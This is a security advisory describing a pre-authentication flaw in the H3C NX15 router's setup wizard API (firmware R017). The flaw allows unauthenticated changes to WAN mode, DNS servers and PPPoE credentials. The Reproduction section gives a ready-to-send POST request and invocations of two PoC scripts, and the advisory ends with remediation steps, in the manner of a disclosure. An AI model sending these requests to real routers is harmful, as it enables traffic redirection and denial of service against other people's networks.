# H3C NX15 R017 `/api/wizard/networkSetup` Pre-authentication WAN Configuration Modification

## Summary

H3C NX15 Router firmware NX15V100R017 exposes the setup wizard endpoint `/api/wizard/networkSetup` without authentication. A remote attacker who can reach the web management interface can modify WAN configuration before login.

The issue allows unauthenticated changes to WAN mode, static addressing, DNS servers, and PPPoE credentials. This can disrupt connectivity or redirect router traffic through attacker-controlled network settings.

## Vendor and Product

- Vendor: H3C
- Product: NX15 Router
- Affected firmware: NX15V100R017 / R017
- Component: Web setup wizard API
- Vulnerable endpoint: `POST /api/wizard/networkSetup`

## Vulnerability Type

- Missing authentication for a critical configuration function
- Suggested CWE: CWE-306
- Attack vector: Remote
- Authentication required: No
- User interaction required: No
- Privileges required: None

## Impact

An unauthenticated attacker can modify WAN configuration, including:

- Disabling the WAN interface.
- Changing the WAN mode to DHCP, static IP, PPPoE, bridge, or disabled.
- Replacing DNS servers.
- Writing attacker-controlled PPPoE username and password values.
- Causing denial of service or traffic redirection.

## Technical Details

The web API exposes wizard endpoints before login. The vulnerable endpoint:

```text
/api/wizard/networkSetup
```

is processed by the wizard protocol conversion layer and mapped to the privileged backend operation:

```text
esps.wan set
```

The Lua wizard mapping constructs an internal ubus request equivalent to:

```lua
ubus_cmd[1] = {
  ["id"] = 1,
  ["path"] = "esps.wan",
  ["func"] = "set",
  ["args"] = { ["list"] = { para } },
  ["type"] = 0
}
```

The wizard protocol handler performs body parsing and protocol conversion, but it does not add an authentication check. As a result, an unauthenticated HTTP request can reach the high-privilege WAN configuration backend.

## Firmware Paths for Audit

The following paths are firmware-internal paths relative to the extracted firmware root filesystem:

- `/www/api`: web API binary that dispatches `/api/wizard/*` requests and contains the wizard protocol forwarding logic.
- `/usr/lib/lua/wizard/networkSetup.lua`: Lua mapping for `/api/wizard/networkSetup`; maps the wizard request to `esps.wan set`.
- `/usr/lib/lua/protol_cvt.lua`: wizard protocol conversion layer used by the web API before calling backend ubus objects.
- `/usr/libexec/rpcd/esps.wan`: privileged WAN configuration backend script implementing the `set` method.

## Reproduction

Use the included PoC to change the WAN mode without logging in:

```bash
python3 poc/07_preauth_wizard_networksetup_toggle.py \
  --base http://192.168.8.1
```

Use the broader PoC to test static, PPPoE, or DNS-modification cases:

```bash
python3 poc/06_preauth_wizard_networksetup_hijack.py \
  --base http://192.168.8.1 \
  --mode static
```

Manual request example:

```http
POST /api/wizard/networkSetup HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json

{
  "intf": "WAN1",
  "workMode": "static",
  "ip": "1.2.3.4",
  "submask": "255.255.255.0",
  "gwIp": "1.2.3.1",
  "dnsMaster": "8.8.8.8",
  "dnsSlave": "1.1.1.1",
  "mtu": 1500
}
```

Expected result:

- The request succeeds without an `AUTHENTICATION` header.
- Reading the network configuration shows the modified WAN values.
- The PoC can restore the WAN mode after verification.

## Evidence

- Static analysis shows the wizard endpoint maps directly to `esps.wan set`.
- No web session validation is performed before the wizard request is converted and forwarded.
- Runtime testing confirmed unauthenticated modification of WAN mode, static IP settings, DNS settings, and PPPoE fields.

## Attachments

- Report: `report/05_preauth_wizard_networksetup_report.md`
- PoC: `poc/06_preauth_wizard_networksetup_hijack.py`
- PoC: `poc/07_preauth_wizard_networksetup_toggle.py`

## Remediation

- Require a valid administrator session for `/api/wizard/networkSetup`.
- Restrict setup wizard write operations after initial device provisioning is complete.
- Enforce authentication in the central wizard protocol handler, not only in individual Lua mappings.
- Add server-side validation and audit logging for WAN configuration changes.
